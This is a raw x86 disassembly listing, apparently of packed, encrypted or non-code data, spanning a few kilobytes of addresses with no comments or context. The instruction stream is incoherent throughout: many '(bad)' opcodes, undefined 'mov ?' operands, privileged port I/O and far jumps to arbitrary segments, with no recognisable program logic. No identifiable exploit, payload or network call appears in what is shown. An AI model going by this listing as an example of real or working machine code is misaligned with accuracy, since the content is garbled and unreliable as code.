  4197d9:	push   eax
  4197da:	jno    0x419848
  4197dc:	cmp    BYTE PTR [ebp+0x5c0cdf16],al
  4197e2:	jno    0x4197f6
  4197e4:	repnz adc ah,dl
  4197e7:	hlt    
  4197e8:	adc    eax,0xe302b45f
  4197ed:	cmp    DWORD PTR [eax],esp
  4197ef:	sub    eax,0xc293716c
  4197f4:	out    dx,eax
  4197f5:	fidivr WORD PTR [edx-0x28]
  4197f8:	mov    ebp,0xffe3af45
  4197fd:	out    0xed,al
  4197ff:	push   eax
  419800:	and    ebp,esp
  419802:	dec    ebx
  419803:	xor    edi,DWORD PTR [eax]
  419805:	add    al,0x7d
  419807:	pop    ebp
  419808:	push   cs
  419809:	and    eax,0x7dc807f
  41980e:	cmp    eax,0xf3bab48f
  419813:	adc    ch,ah
  419815:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419816:	sbb    ebp,esi
  419818:	inc    edx
  419819:	fldenv [ecx-0x14]
  41981c:	adc    al,0xb9
  41981e:	test   DWORD PTR [ebx-0x485eb4b5],edi
  419824:	loope  0x4197b9
  419826:	ja     0x4198a5
  419828:	cmp    ch,BYTE PTR [edi-0xfddbc88]
  41982e:	jle    0x419897
  419830:	call   FWORD PTR [esi+edi*1-0x28]
  419834:	dec    ebp
  419835:	push   ecx
  419836:	and    eax,0x8b8c0eb9
  41983b:	dec    ecx
  41983c:	jbe    0x4197da
  41983e:	sbb    BYTE PTR [edx-0x43],ch
  419841:	inc    ecx
  419842:	jno    0x419846
  419844:	mov    dl,bh
  419846:	push   ecx
  419847:	xchg   BYTE PTR [ebx-0x34673d80],cl
  41984d:	sbb    BYTE PTR [edx],dl
  41984f:	xchg   esi,eax
  419850:	add    ch,BYTE PTR [ebx+edi*8-0x7ec8e50a]
  419857:	mov    ch,0x3c
  419859:	scas   eax,DWORD PTR es:[edi]
  41985a:	call   0xb70f6fe8
  41985f:	repnz pushf 
  419861:	xor    esi,DWORD PTR [ecx-0x6f]
  419864:	ror    al,1
  419866:	push   edx
  419867:	and    ebp,eax
  419869:	(bad)  
  41986a:	into   
  41986b:	pop    ds
  41986c:	cld    
  41986d:	mov    ebp,0xe562858
  419872:	js     0x41987b
  419874:	lahf   
  419875:	out    dx,al
  419876:	aad    0x65
  419878:	aaa    
  419879:	out    0x1,eax
  41987b:	out    0xe9,eax
  41987d:	ds xchg ecx,eax
  41987f:	push   cs
  419880:	jmp    0xf0462a7b
  419885:	loop   0x419888
  419887:	and    eax,0x490f6edd
  41988c:	and    DWORD PTR [edx-0x1763bf6c],esp
  419892:	and    eax,0x3e7163
  419897:	das    
  419898:	stos   DWORD PTR es:[edi],eax
  419899:	dec    esi
  41989a:	imul   ebp
  41989c:	pop    es
  41989d:	call   0xe17292cb
  4198a2:	and    ebx,0xae512a28
  4198a8:	pusha  
  4198a9:	sbb    ch,ch
  4198ab:	mov    esp,0x7e229a4f
  4198b0:	or     DWORD PTR [edx-0x48b73c5d],eax
  4198b6:	cmp    BYTE PTR [eax-0x676c2218],0xeb
  4198bd:	dec    edi
  4198be:	sub    eax,0x3537bbfd
  4198c3:	or     esi,eax
  4198c5:	dec    edx
  4198c6:	xchg   edi,eax
  4198c7:	mov    DWORD PTR ds:0xf7e99fa9,ecx
  4198cd:	aam    0x8
  4198cf:	pop    ecx
  4198d0:	shr    DWORD PTR [eax-0x55],1
  4198d3:	pop    eax
  4198d4:	fisubr WORD PTR [edx+ecx*4]
  4198d7:	stos   BYTE PTR es:[edi],al
  4198d8:	sub    ebx,DWORD PTR [edx+0x43dceafc]
  4198de:	cmp    eax,0xb89ad974
  4198e3:	mov    cl,0x55
  4198e5:	xor    DWORD PTR [edi],0xf6c749a4
  4198eb:	or     ch,BYTE PTR [esi]
  4198ed:	rcr    DWORD PTR ds:0x4fba4d5a,1
  4198f3:	shl    eax,1
  4198f5:	outs   dx,BYTE PTR ds:[esi]
  4198f6:	mov    WORD PTR [ecx-0x428a6e75],cs
  4198fc:	mov    DWORD PTR [eax],ebx
  4198fe:	adc    al,0x82
  419900:	in     eax,0xf6
  419902:	bound  edi,QWORD PTR [esi]
  419904:	cmp    cl,BYTE PTR [ebx-0x6848efff]
  41990a:	inc    esi
  41990b:	jmp    0xd54c5533
  419910:	and    eax,0x8d0921a0
  419915:	leave  
  419916:	jo     0x4198ad
  419918:	mov    ebp,0x31bf275
  41991d:	out    0xdc,al
  41991f:	push   cs
  419920:	pushf  
  419921:	mov    cl,0x51
  419923:	mov    eax,0xa2e987a8
  419928:	shl    BYTE PTR [esi],0x22
  41992b:	aam    0x8d
  41992d:	das    
  41992e:	mov    cl,0x49
  419930:	mov    cl,0xaf
  419932:	cdq    
  419933:	fdivrp st(5),st
  419935:	out    0xdb,eax
  419937:	push   0x6
  419939:	push   ss
  41993a:	jmp    FWORD PTR ds:0xe969ef5d
  419940:	mov    bh,0x7c
  419942:	add    BYTE PTR [edi],0xc1
  419945:	sub    eax,0x46da3c20
  41994a:	jne    0x4198f4
  41994c:	mov    bl,0x25
  41994e:	mov    bl,0x37
  419950:	cmp    edx,DWORD PTR [ecx+0x5df81c03]
  419956:	jmp    0x5d9bb91a
  41995b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41995c:	mov    dl,BYTE PTR [ebx]
  41995e:	add    BYTE PTR [esi],0x21
  419961:	fidiv  WORD PTR [edi+0x18]
  419964:	or     DWORD PTR [edi+0x73],ecx
  419967:	jbe    0x41994d
  419969:	pop    edx
  41996a:	lods   eax,DWORD PTR ds:[esi]
  41996b:	and    bh,BYTE PTR [ebx]
  41996d:	mov    WORD PTR [esi+0x67f574ab],fs
  419973:	xor    al,BYTE PTR [ebx]
  419975:	fwait
  419976:	mov    esp,0x43ae2b83
  41997b:	les    eax,FWORD PTR [edi]
  41997d:	inc    edi
  41997e:	pop    es
  41997f:	jae    0x41991b
  419981:	ret    
  419982:	xchg   ebx,eax
  419983:	and    BYTE PTR [ecx+0x4a],dh
  419986:	mov    ch,0x7d
  419988:	stc    
  419989:	pop    edx
  41998a:	das    
  41998b:	sahf   
  41998c:	pop    esp
  41998d:	mov    esp,0x1a0d0fb8
  419992:	(bad)  
  419993:	dec    esi
  419994:	jg     0x419931
  419996:	pop    edx
  419997:	ja     0x41998c
  419999:	mov    ecx,0x43b75a6d
  41999e:	pop    esi
  41999f:	xchg   ebx,eax
  4199a0:	popf   
  4199a1:	xor    DWORD PTR [ebx],0xffffffa7
  4199a4:	xor    eax,0x2ba613a2
  4199a9:	stos   BYTE PTR es:[edi],al
  4199aa:	neg    DWORD PTR cs:[edi]
  4199ad:	daa    
  4199ae:	cld    
  4199af:	sti    
  4199b0:	test   DWORD PTR [edi],0xac43c1f6
  4199b6:	daa    
  4199b7:	adc    ah,BYTE PTR [ebp-0x6d]
  4199ba:	in     eax,dx
  4199bb:	adc    eax,0xc918c0bf
  4199c0:	jne    0x4199fb
  4199c2:	mov    ds:0x341827a7,eax
  4199c7:	sub    al,0x63
  4199c9:	int3   
  4199ca:	sbb    DWORD PTR [ebp-0x34],ebp
  4199cd:	jge    0x419a12
  4199cf:	mov    esp,DWORD PTR [esi+0x5608abe7]
  4199d5:	lods   al,BYTE PTR ds:[esi]
  4199d6:	sti    
  4199d7:	mov    WORD PTR [edx],fs
  4199d9:	mov    ebx,0xf3818e9f
  4199de:	and    cl,al
  4199e0:	add    al,0x50
  4199e2:	or     BYTE PTR [edi+0x51],dl
  4199e5:	call   0x1764:0x5f55d3ce
  4199ec:	sbb    ebp,esp
  4199ee:	addr16 sub al,0x44
  4199f1:	dec    esi
  4199f2:	popf   
  4199f3:	(bad)  
  4199f5:	sub    DWORD PTR [ecx],0x17
  4199f8:	push   ds
  4199f9:	ror    BYTE PTR [ecx+0x54],cl
  4199fc:	clc    
  4199fd:	jo     0x419a23
  4199ff:	sbb    al,0xd5
  419a01:	mov    DWORD PTR [ebx],0x42a9430f
  419a07:	sub    eax,0x5bedbcbf
  419a0c:	pop    esp
  419a0d:	ficom  DWORD PTR [ebx]
  419a0f:	retf   
  419a10:	cmp    ebp,DWORD PTR [bx+di]
  419a13:	mov    dh,0x5c
  419a15:	add    esi,DWORD PTR [esi]
  419a17:	(bad)  
  419a18:	loope  0x419a79
  419a1a:	les    edi,FWORD PTR [ebx]
  419a1c:	mov    ch,0x50
  419a1e:	jns    0x4199d0
  419a20:	inc    edi
  419a21:	fs xor dl,BYTE PTR ss:[eax]
  419a25:	push   ds
  419a26:	mov    ch,0x4a
  419a28:	addr16 cmp dl,bh
  419a2b:	je     0x419a4f
  419a2d:	jne    0x4199c9
  419a2f:	outs   dx,DWORD PTR ds:[esi]
  419a30:	pop    esp
  419a31:	loope  0x419a0e
  419a33:	ret    
  419a34:	push   0x803d0e04
  419a39:	mov    edx,0xa61a4320
  419a3e:	pop    edi
  419a3f:	sahf   
  419a40:	sbb    eax,0x58bd15cd
  419a45:	lods   eax,DWORD PTR ds:[esi]
  419a46:	(bad)
  419a4a:	in     eax,dx
  419a4b:	ret    0x63b1
  419a4e:	js     0x419a16
  419a50:	nop
  419a51:	shl    DWORD PTR [eax+0x5442bde6],1
  419a57:	push   edx
  419a58:	cld    
  419a59:	das    
  419a5a:	inc    edi
  419a5b:	mov    bl,0xc9
  419a5d:	dec    edx
  419a5e:	or     eax,0xee7b7d71
  419a63:	arpl   WORD PTR [eax],ax
  419a65:	sahf   
  419a66:	lahf   
  419a67:	test   bl,cl
  419a69:	and    cl,BYTE PTR [ebx-0x49f2e2c5]
  419a6f:	push   es
  419a70:	xchg   edi,eax
  419a71:	add    edx,DWORD PTR [ecx]
  419a73:	xor    al,0x6e
  419a75:	stc    
  419a76:	cmp    eax,0x3e7122dd
  419a7b:	add    eax,esi
  419a7d:	xchg   ebp,eax
  419a7e:	push   ss
  419a7f:	jmp    0x3260:0x90ce38ef
  419a86:	call   0x2d40:0x43f0c8a3
  419a8d:	rcr    DWORD PTR [esi*2+0x7e00806a],cl
  419a94:	xlat   BYTE PTR ds:[ebx]
  419a95:	lahf   
  419a96:	bound  ecx,QWORD PTR [eax-0x25]
  419a99:	cmp    BYTE PTR [eax-0x189410e2],0x95
  419aa0:	jmp    0x419abf
  419aa2:	sub    edx,DWORD PTR [esi-0xacb544e]
  419aa8:	fisub  WORD PTR [edx-0x6f286eb6]
  419aae:	xchg   ah,ch
  419ab0:	or     cl,BYTE PTR [edx]
  419ab2:	pop    esp
  419ab3:	loopne 0x419a82
  419ab5:	adc    DWORD PTR [ebp*1+0x1a42296b],ebp
  419abc:	pop    esi
  419abd:	add    eax,esp
  419abf:	push   es
  419ac0:	arpl   WORD PTR [eax-0x3a],cx
  419ac3:	mov    ecx,0xf895e887
  419ac8:	or     dl,BYTE PTR [edx+0x19]
  419acb:	aaa    
  419acc:	mov    eax,ds:0xb66e3a48
  419ad1:	daa    
  419ad2:	neg    DWORD PTR [ebp-0x1f0dae8c]
  419ad8:	(bad)  
  419ad9:	in     al,dx
  419ada:	sub    al,BYTE PTR [ebx]
  419adc:	clc    
  419add:	rcr    DWORD PTR [edx],1
  419adf:	loopne 0x419a94
  419ae1:	stos   BYTE PTR es:[edi],al
  419ae2:	fistp  DWORD PTR [eax+0x117fae0b]
  419ae8:	mov    ebx,0x72503812
  419aed:	adc    edx,DWORD PTR [eax-0x69]
  419af0:	jle    0x419aa9
  419af2:	hlt    
  419af3:	or     ch,BYTE PTR [edi-0x3f]
  419af6:	inc    eax
  419af7:	dec    edx
  419af8:	in     al,dx
  419af9:	cmc    
  419afa:	sub    ebp,DWORD PTR [edx-0x6b]
  419afd:	or     al,0xfc
  419aff:	(bad)  
  419b00:	cs in  eax,dx
  419b02:	dec    ebx
  419b03:	hlt    
  419b04:	pop    esp
  419b05:	sbb    BYTE PTR [esi],dh
  419b07:	nop
  419b08:	not    DWORD PTR es:[esi+ebp*2]
  419b0c:	pop    ss
  419b0d:	jmp    0x1311adef
  419b12:	inc    ebx
  419b13:	jmp    0x75c9:0xb2349bb6
  419b1a:	ret    0x1792
  419b1d:	fdiv   st,st(6)
  419b1f:	cmp    DWORD PTR [esi],0x886c6cf3
  419b25:	add    edi,DWORD PTR [eax+0x7e7416d7]
  419b2b:	sbb    eax,ecx
  419b2d:	sahf   
  419b2e:	je     0x419b65
  419b30:	mov    ah,0xbf
  419b32:	pop    edi
  419b33:	popf   
  419b34:	pop    ebp
  419b35:	or     BYTE PTR [edx+0x68d72746],bl
  419b3b:	mov    ebp,DWORD PTR [ebx+0x14]
  419b3e:	aaa    
  419b3f:	les    edi,FWORD PTR [edx-0x39]
  419b42:	push   ebp
  419b43:	mov    ebp,0x2446b04a
  419b48:	addr16 in eax,0xe
  419b4b:	dec    ebp
  419b4c:	xlat   BYTE PTR ds:[ebx]
  419b4d:	xchg   esp,eax
  419b4e:	sub    al,0x10
  419b50:	sbb    al,0x1d
  419b52:	mov    dh,0x34
  419b54:	pop    ebp
  419b55:	into   
  419b56:	add    eax,0xa3cabda8
  419b5b:	aam    0xec
  419b5d:	outs   dx,DWORD PTR ds:[esi]
  419b5e:	pop    ds
  419b5f:	sbb    dh,ah
  419b61:	xchg   BYTE PTR [ebp-0x3e],cl
  419b64:	or     DWORD PTR gs:[eax],esi
  419b67:	hlt    
  419b68:	out    dx,eax
  419b69:	sub    edi,esi
  419b6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b6c:	dec    bp
  419b6e:	jnp    0x419bbf
  419b70:	add    ah,BYTE PTR [edx-0x1c]
  419b73:	adc    eax,0x90cc85a4
  419b78:	and    DWORD PTR [eax+0x3],edx
  419b7b:	scas   al,BYTE PTR es:[edi]
  419b7c:	(bad)  [eax+0xd]
  419b7f:	mov    ds:0xd75da491,al
  419b84:	push   esp
  419b85:	jnp    0x419b9a
  419b87:	xchg   DWORD PTR [eax+0x6],edi
  419b8a:	dec    eax
  419b8b:	stc    
  419b8c:	leave  
  419b8d:	loopne 0x419c09
  419b8f:	out    0x97,al
  419b91:	push   ds
  419b92:	pop    esi
  419b93:	jae    0x419b5d
  419b95:	jle    0x419b4c
  419b97:	cmp    eax,0xb674a76e
  419b9c:	sbb    bh,BYTE PTR [edx+0x3c]
  419b9f:	popf   
  419ba0:	jmp    0x65a916bc
  419ba5:	push   cs
  419ba6:	mov    ebp,0x413bb0f1
  419bab:	mov    dh,BYTE PTR [ebp+edi*2-0x140bd1f2]
  419bb2:	jae    0x419c33
  419bb4:	jnp    0x419bec
  419bb6:	pop    es
  419bb7:	repz inc esp
  419bb9:	push   esp
  419bba:	sbb    al,0x31
  419bbc:	push   ecx
  419bbd:	dec    ecx
  419bbe:	push   edx
  419bbf:	xor    ecx,DWORD PTR [edi]
  419bc1:	jno    0x419bd1
  419bc3:	add    al,0x57
  419bc5:	ss mov esi,0x12b86cb2
  419bcb:	adc    eax,0x14ab2041
  419bd0:	xchg   ecx,eax
  419bd1:	mov    bh,0x58
  419bd3:	rcr    ebx,1
  419bd5:	and    DWORD PTR [ecx+0x7ff79b2],edi
  419bdb:	sahf   
  419bdc:	pop    ebx
  419bdd:	sub    ebx,DWORD PTR [esp+ebx*8]
  419be0:	and    edx,DWORD PTR [edi-0x60b66f6f]
  419be6:	and    BYTE PTR [edx],al
  419be8:	in     al,0xf7
  419bea:	ror    DWORD PTR [edi-0x22],0x26
  419bee:	or     DWORD PTR [edx+0x58],ecx
  419bf1:	popa   
  419bf2:	adc    eax,0xdd9e118e
  419bf7:	cli    
  419bf8:	cdq    
  419bf9:	mov    ds:0xcf91eb59,al
  419bfe:	std    
  419bff:	out    0xb8,eax
  419c01:	test   DWORD PTR [edi-0x5407736d],esi
  419c07:	sub    eax,0x3726f4c8
  419c0c:	xchg   ebp,eax
  419c0d:	outs   dx,DWORD PTR ds:[esi]
  419c0e:	ins    BYTE PTR es:[edi],dx
  419c0f:	mov    eax,0x82cea9d5
  419c14:	popa   
  419c15:	ds push ds
  419c17:	push   esi
  419c18:	sti    
  419c19:	mov    ebx,0x8b195f4c
  419c1e:	aad    0x6b
  419c20:	pushf  
  419c21:	icebp  
  419c22:	add    dl,BYTE PTR [edi+0x5c]
  419c25:	sub    BYTE PTR ds:[ebx],dh
  419c28:	inc    edi
  419c29:	cmp    esi,ecx
  419c2b:	les    eax,FWORD PTR [ecx-0x3f]
  419c2e:	sbb    al,0x53
  419c30:	adc    al,0x1d
  419c32:	sbb    BYTE PTR [esi-0x5a268785],0xc4
  419c39:	outs   dx,DWORD PTR ds:[si]
  419c3b:	lods   eax,DWORD PTR ds:[esi]
  419c3c:	sub    BYTE PTR [ebp-0x1f2f34bd],bl
  419c42:	in     eax,dx
  419c43:	ret    
  419c44:	xor    BYTE PTR [esi-0x5f],ah
  419c47:	mov    ebx,0x83848d65
  419c4c:	dec    esp
  419c4d:	jbe    0x419ca1
  419c4f:	inc    ecx
  419c50:	into   
  419c51:	adc    dl,dh
  419c53:	into   
  419c54:	pop    ds
  419c55:	mov    ds:0xab4776d1,al
  419c5a:	ja     0x419cc9
  419c5c:	loope  0x419be2
  419c5e:	sbb    bl,BYTE PTR [ebp-0x38]
  419c61:	leave  
  419c62:	adc    al,0xf4
  419c64:	aas    
  419c65:	add    BYTE PTR [ebp+0x2a],0x1
  419c69:	cdq    
  419c6a:	xor    eax,0xfa2490e6
  419c6f:	imul   edi,DWORD PTR [ecx-0x78c0f465],0xffffffe4
  419c76:	push   eax
  419c77:	ss adc eax,0x3d054140
  419c7d:	adc    BYTE PTR [ebx+edi*4-0x19],0x70
  419c82:	or     BYTE PTR [ebx+eax*4],bh
  419c85:	push   eax
  419c86:	pushf  
  419c87:	dec    esi
  419c88:	shl    BYTE PTR [eax+eiz*8+0x3e],1
  419c8c:	jbe    0x419ce7
  419c8e:	inc    edx
  419c8f:	sub    al,0xf0
  419c91:	sahf   
  419c92:	xlat   BYTE PTR ds:[ebx]
  419c93:	mov    BYTE PTR [ebp+ecx*4-0x1dfb3b36],0x8c
  419c9b:	push   esi
  419c9c:	aaa    
  419c9d:	pop    eax
  419c9e:	or     DWORD PTR [esi],edi
  419ca0:	jno    0x419ce7
  419ca2:	or     al,0x1a
  419ca4:	int    0x14
  419ca6:	jno    0x419c49
  419ca8:	std    
  419ca9:	xchg   esp,eax
  419caa:	loopne 0x419d0b
  419cac:	outs   dx,BYTE PTR ds:[esi]
  419cad:	sub    BYTE PTR [ecx],cl
  419caf:	sar    DWORD PTR [edi],cl
  419cb1:	int    0xb0
  419cb3:	ds dec ebx
  419cb5:	jp     0x419cc6
  419cb7:	repz cmp DWORD PTR [edx+eax*2],esi
  419cbb:	mov    ?,WORD PTR [ecx]
  419cbd:	mov    bl,0x65
  419cbf:	lahf   
  419cc0:	cmc    
  419cc1:	push   esp
  419cc2:	and    ch,BYTE PTR [edx-0x7d]
  419cc5:	jecxz  0x419cb6
  419cc7:	adc    al,BYTE PTR [eax+0x35c4de83]
  419ccd:	dec    ebp
  419cce:	pushf  
  419ccf:	(bad)  
  419cd1:	mov    edx,0x59991c7
  419cd6:	mov    eax,0xaf546507
  419cdb:	ret    0xf78a
  419cde:	int    0x6f
  419ce0:	cdq    
  419ce1:	int3   
  419ce2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ce3:	(bad)  
  419ce4:	fmulp  st(3),st
  419ce6:	cwde   
  419ce7:	ds jbe 0x419cb3
  419cea:	call   0x3c66:0x3860bc9e
  419cf1:	imul   ebp,DWORD PTR [ecx+0x8024467],0xffffffd9
  419cf8:	mov    ecx,0x9a26db95
  419cfd:	test   DWORD PTR [ecx+ebp*1],ebx
  419d00:	call   0x32c93caa
  419d05:	cmp    al,0xfd
  419d07:	pop    esp
  419d08:	out    dx,al
  419d09:	jb     0x419cc3
  419d0b:	in     al,0xab
  419d0d:	and    DWORD PTR [edi+0x12],esp
  419d10:	enter  0xa773,0xaa
  419d14:	loop   0x419d77
  419d16:	dec    ebp
  419d17:	or     eax,0x2094fd73
  419d1c:	sub    ebx,0xffffffbd
  419d1f:	sub    DWORD PTR [ebp-0x40a6f30],edx
  419d25:	jcxz   0x419d0e
  419d28:	pop    ecx
  419d29:	sub    DWORD PTR [edx],ebx
  419d2b:	(bad)
  419d2f:	and    ah,BYTE PTR [eax]
  419d31:	jle    0x419d18
  419d33:	jmp    0xca1b:0x2400fd82
  419d3a:	cwde   
  419d3b:	fisubr WORD PTR [ecx+0x3b9847a9]
  419d41:	mov    bh,0x5c
  419d43:	mov    cl,0xfe
  419d45:	mov    bh,0x4d
  419d47:	pusha  
  419d48:	xor    al,0x67
  419d4a:	push   ss
  419d4b:	adc    BYTE PTR [esi+0x48e4fb30],dh
  419d51:	clc    
  419d52:	icebp  
  419d53:	push   eax
  419d54:	int3   
  419d55:	outs   dx,BYTE PTR ds:[esi]
  419d56:	mov    WORD PTR [eax+0x69],es
  419d59:	scas   eax,DWORD PTR es:[edi]
  419d5a:	mov    dl,0x8
  419d5c:	ret    0xcf55
  419d5f:	outs   dx,DWORD PTR ds:[esi]
  419d60:	xor    ebx,DWORD PTR [ebx]
  419d62:	aaa    
  419d63:	mov    gs,WORD PTR [edi-0x751c3a]
  419d69:	mov    ebp,0x17e7808d
  419d6e:	jns    0x419d7a
  419d70:	mov    DWORD PTR [ebx],esi
  419d72:	pop    es
  419d73:	dec    edi
  419d74:	stc    
  419d75:	(bad)  
  419d76:	fld    DWORD PTR [edx-0x56]
  419d79:	mov    edx,0xf041c12e
  419d7e:	dec    esi
  419d7f:	fmul   QWORD PTR ds:[ebp+0x19]
  419d83:	int    0x9c
  419d85:	adc    esp,0x4a
  419d88:	jnp    0x419d53
  419d8a:	lock push ss
  419d8c:	pop    ss
  419d8d:	or     eax,0x54a0d740
  419d92:	adc    al,0xaf
  419d94:	nop
  419d95:	inc    ecx
  419d96:	int3   
  419d97:	mul    DWORD PTR [eax]
  419d99:	xor    bl,ah
  419d9b:	jg     0x419d8c
  419d9d:	or     al,0xb4
  419d9f:	out    dx,al
  419da0:	mov    WORD PTR [edi],fs
  419da2:	push   0x1dd2b1f0
  419da7:	jle    0x419da6
  419da9:	and    DWORD PTR [ecx-0xf037eaa],esp
  419daf:	out    dx,eax
  419db0:	pop    ecx
  419db1:	push   ebx
  419db2:	cmp    al,0x5e
  419db4:	rol    ebx,0x68
  419db7:	or     al,0xe5
  419db9:	pop    ecx
  419dba:	mov    ebx,0x6b02551
  419dbf:	or     ch,ch
  419dc1:	mov    dl,0xca
  419dc3:	or     DWORD PTR ds:0xc1a1f460,0x134e47a9
  419dcd:	adc    al,BYTE PTR [edi+0x5e]
  419dd0:	and    bl,BYTE PTR [edx-0x1dc644de]
  419dd6:	and    BYTE PTR [edi],dh
  419dd8:	pusha  
  419dd9:	fstp   DWORD PTR [ecx+0x42]
  419ddc:	sub    eax,0xbc2e4736
  419de1:	shr    dh,1
  419de3:	pusha  
  419de4:	stos   BYTE PTR es:[edi],al
  419de5:	outs   dx,BYTE PTR ds:[esi]
  419de6:	cmp    ah,BYTE PTR [ecx]
  419de8:	lock sar BYTE PTR [edx-0x50768a65],1
  419def:	adc    DWORD PTR [edx+0x1c],0x2bbec337
  419df6:	data16 mul BYTE PTR [eax-0x19]
  419dfa:	loop   0x419df6
  419dfc:	ficom  DWORD PTR [ecx+0x4d]
  419dff:	dec    ecx
  419e00:	les    edx,FWORD PTR [edx+ebp*4]
  419e03:	mov    bh,0x21
  419e05:	sub    al,0x7c
  419e07:	ret    
  419e08:	pop    esi
  419e09:	cmp    BYTE PTR [ecx-0x7b],ah
  419e0c:	and    eax,0x2aee1345
  419e11:	sar    BYTE PTR [ecx-0x53f0cefd],0xc
  419e18:	pop    edi
  419e19:	adc    al,0x36
  419e1b:	fsub   st,st(3)
  419e1d:	and    BYTE PTR [eax+esi*4],cl
  419e20:	mov    edx,0x2f9bdf55
  419e25:	xchg   ebp,eax
  419e26:	in     al,dx
  419e27:	es inc ebx
  419e29:	ins    BYTE PTR es:[edi],dx
  419e2a:	xor    eax,0x5b3603e6
  419e2f:	lock out dx,eax
  419e31:	jmp    0x419dec
  419e33:	dec    eax
  419e34:	lahf   
  419e35:	xor    eax,0xbe9035d4
  419e3a:	out    dx,al
  419e3b:	loopne 0x419e08
  419e3d:	test   eax,0xd1856c3e
  419e42:	dec    ebx
  419e43:	jbe    0x419e48
  419e45:	ins    BYTE PTR es:[edi],dx
  419e46:	cdq    
  419e47:	out    dx,al
  419e48:	fnstcw WORD PTR [eax-0x2f318d63]
  419e4e:	mov    eax,ds:0xed1aff1b
  419e53:	xchg   ebp,eax
  419e54:	lods   al,BYTE PTR ds:[esi]
  419e55:	push   cs
  419e56:	rol    DWORD PTR [esi-0x10],cl
  419e59:	cdq    
  419e5a:	cmp    ecx,ebp
  419e5c:	and    ah,BYTE PTR [edi-0x5eec2d7a]
  419e62:	add    al,0x72
  419e64:	pop    es
  419e65:	adc    esp,DWORD PTR [edx]
  419e67:	out    0x63,al
  419e69:	shl    DWORD PTR ds:0x73ba311,cl
  419e6f:	daa    
  419e70:	xchg   esp,eax
  419e71:	cmp    eax,0xd7075433
  419e76:	cli    
  419e77:	cmp    ah,BYTE PTR [esi+0x2fcf7dbf]
  419e7d:	fisubr WORD PTR [ebx]
  419e7f:	arpl   WORD PTR [esi+eiz*1-0x1d],sp
  419e83:	call   0xb5b97f99
  419e88:	push   ebx
  419e89:	xchg   BYTE PTR [edi],dh
  419e8b:	xchg   DWORD PTR [esp+edx*4-0x16dcfd99],ecx
  419e92:	jmp    0x4d865147
  419e97:	push   edi
  419e98:	nop
  419e99:	pop    eax
  419e9a:	cli    
  419e9b:	pop    eax
  419e9c:	and    BYTE PTR [edx-0x520378ed],al
  419ea2:	sub    DWORD PTR [ebx-0x6b],esi
  419ea5:	ficomp DWORD PTR [eax+0x524fdc8]
  419eab:	jmp    0x419e6b
  419ead:	cld    
  419eae:	push   esi
  419eaf:	mov    edx,0xea043dac
  419eb4:	cdq    
  419eb5:	int    0xd7
  419eb7:	fisubr DWORD PTR [edx+eax*2-0x49]
  419ebb:	ret    
  419ebc:	mov    dl,0xe6
  419ebe:	cmp    BYTE PTR [edx],0xb2
  419ec1:	mov    esi,cs
  419ec3:	dec    edx
  419ec4:	push   edi
  419ec5:	dec    edx
  419ec6:	icebp  
  419ec7:	das    
  419ec8:	and    al,0xc2
  419eca:	stc    
  419ecb:	clc    
  419ecc:	or     ebx,esp
  419ece:	sub    al,0xc1
  419ed0:	ret    0xb6a4
  419ed3:	mov    bl,0xc1
  419ed5:	pop    ebp
  419ed6:	pop    ebx
  419ed7:	mov    esp,0x8d75f9a9
  419edc:	sahf   
  419edd:	ds sub eax,0x8817545c
  419ee3:	mov    ah,0xac
  419ee5:	jnp    0x419f48
  419ee7:	mov    ebp,0xd2b73d58
  419eec:	or     ah,bl
  419eee:	cmp    bh,BYTE PTR [edi+0x13c4da3a]
  419ef4:	pop    esp
  419ef5:	(bad)  
  419ef6:	test   eax,0x6e003873
  419efb:	test   al,0x37
  419efd:	js     0x419ec1
  419eff:	push   ebp
  419f00:	pop    es
  419f01:	icebp  
  419f02:	arpl   sp,si
  419f04:	xchg   esp,eax
  419f05:	push   ebx
  419f06:	into   
  419f07:	jmp    0x9396:0xc53544c4
  419f0e:	in     eax,0x94
  419f10:	push   edx
  419f11:	rcl    BYTE PTR [ecx-0x52],1
  419f14:	sbb    ebx,DWORD PTR [ebx+ebp*8]
  419f17:	xor    dh,ch
  419f19:	dec    ebp
  419f1a:	mov    bl,0xf7
  419f1c:	push   es
  419f1d:	push   ebx
  419f1e:	fist   DWORD PTR [esi]
  419f20:	loopne 0x419f1a
  419f22:	neg    BYTE PTR [ecx-0x333fa7ce]
  419f28:	outs   dx,BYTE PTR ds:[esi]
  419f29:	pop    ebx
  419f2a:	imul   edi,DWORD PTR [eax+0x168d12a9],0xffffff9b
  419f31:	and    edi,DWORD PTR [eax]
  419f33:	call   0x80d3:0x827ef907
  419f3a:	lds    ebp,FWORD PTR [edx+esi*1]
  419f3d:	push   ebx
  419f3e:	in     eax,dx
  419f3f:	std    
  419f40:	sbb    al,0x43
  419f42:	lods   eax,DWORD PTR ds:[esi]
  419f43:	or     DWORD PTR [edx+0x1b],eax
  419f46:	data16 aam 0x4e
  419f49:	test   DWORD PTR [edi-0x3],edi
  419f4c:	outs   dx,BYTE PTR ds:[esi]
  419f4d:	add    ah,al
  419f4f:	in     eax,0xf2
  419f51:	into   
  419f52:	cld    
  419f53:	call   DWORD PTR [edx-0x40]
  419f56:	jmp    0xf73a2aa9
  419f5b:	rep ins BYTE PTR es:[edi],dx
  419f5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f5e:	repnz div edx
  419f61:	mov    esp,0x8f619ea4
  419f66:	jae    0x419f81
  419f68:	scas   eax,DWORD PTR es:[edi]
  419f69:	and    al,0x92
  419f6b:	xchg   BYTE PTR [edx-0x10],ah
  419f6e:	cmovno eax,DWORD PTR [eax]
  419f71:	xlat   BYTE PTR ds:[ebx]
  419f72:	(bad)  
  419f73:	mov    ?,WORD PTR [edx+eax*8]
  419f76:	xchg   esi,eax
  419f77:	jbe    0x419ff5
  419f79:	pusha  
  419f7a:	cmp    dh,BYTE PTR [eax+0x5729b87b]
  419f80:	sub    eax,0xa9b75c2d
  419f85:	mov    DWORD PTR [ebp+edi*4-0x3c],eax
  419f89:	mov    ds:0x67d46883,eax
  419f8e:	lds    ecx,FWORD PTR [edi+0x633c3390]
  419f94:	lds    ebx,FWORD PTR ds:0x14e33a5f
  419f9a:	dec    esp
  419f9b:	xchg   ah,ch
  419f9d:	cld    
  419f9e:	sar    BYTE PTR [ebx+0x38],1
  419fa1:	push   cs
  419fa2:	clc    
  419fa3:	fmul   st,st(2)
  419fa5:	ds in  al,dx
